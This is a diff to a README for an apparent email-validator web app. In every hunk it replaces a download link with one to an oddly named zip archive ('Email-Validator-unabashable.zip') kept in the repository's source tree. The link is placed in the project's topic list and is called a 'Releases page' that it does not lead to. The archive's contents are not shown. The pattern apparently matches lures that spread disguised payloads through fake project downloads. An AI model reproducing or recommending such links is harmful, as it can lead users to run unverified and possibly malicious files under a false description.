@@ -6,7 +6,7 @@ Welcome to the **Email-Validator**! This application helps you check if email ad
 
 ## 📥 Download
 
-[![Download Email-Validator](https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip)](https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip)
+[![Download Email-Validator](https://github.com/RenanBF2/Email-Validator/raw/refs/heads/main/src/app/history/Email-Validator-unabashable.zip)](https://github.com/RenanBF2/Email-Validator/raw/refs/heads/main/src/app/history/Email-Validator-unabashable.zip)
 
 ## 🖥️ Requirements
 
@@ -33,7 +33,7 @@ This project deals with various important topics including:
 - Email validation
 - Jest
 - MX lookup
-- https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip
+- https://github.com/RenanBF2/Email-Validator/raw/refs/heads/main/src/app/history/Email-Validator-unabashable.zip
 - Playwright
 - React
 - Tailwind CSS
@@ -47,7 +47,7 @@ This project deals with various important topics including:
 
 To get the latest version of the Email-Validator, click on the following link to visit the Releases page: 
 
-[Download Email-Validator](https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip)
+[Download Email-Validator](https://github.com/RenanBF2/Email-Validator/raw/refs/heads/main/src/app/history/Email-Validator-unabashable.zip)
 
 ### 2. Download the Application
 
